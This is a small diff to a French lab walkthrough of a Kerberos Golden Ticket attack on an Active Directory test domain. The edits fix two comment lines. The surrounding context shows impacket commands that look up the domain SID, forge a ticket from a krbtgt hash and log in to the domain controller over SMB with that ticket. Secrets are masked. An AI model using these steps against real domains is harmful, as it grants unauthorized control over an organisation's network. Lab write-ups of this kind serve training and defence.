@@ -6,7 +6,7 @@ krbtgt. Comme la signature est valide, il accorde l'accès à n'importe quelle
 ressource sans vérifier si l'utilisateur existe vraiment ou si son mot de passe a changé
 
 
-# Pour forger le ticket, l’attaquant a besoin SID du Controleur de Domaine, donc il
+# Pour forger le ticket, l’attaquant a besoin SID du Controleur de Domaine
 
 ```
 impacket-lookupsid lab-test.local/it_2:*********@192.168.174.133
@@ -23,7 +23,7 @@ impacket-ticketer -nthash ************ -domain-sid S-1-5-21-39*********** -domai
 <img width="1277" height="365" alt="image" src="https://github.com/user-attachments/assets/ca8c4798-c919-417b-83ac-6ce92b2b35d6" />
 
 
-# Se connecter avec le ticket forgée via smb avec impacket-smbclient
+# Se connecter avec le ticket forgé via smb avec impacket-smbclient
 
 ```
 impacket-smbclient -k -no-pass LAB-TEST/GoldUser@WIN-DC.lab-test.local
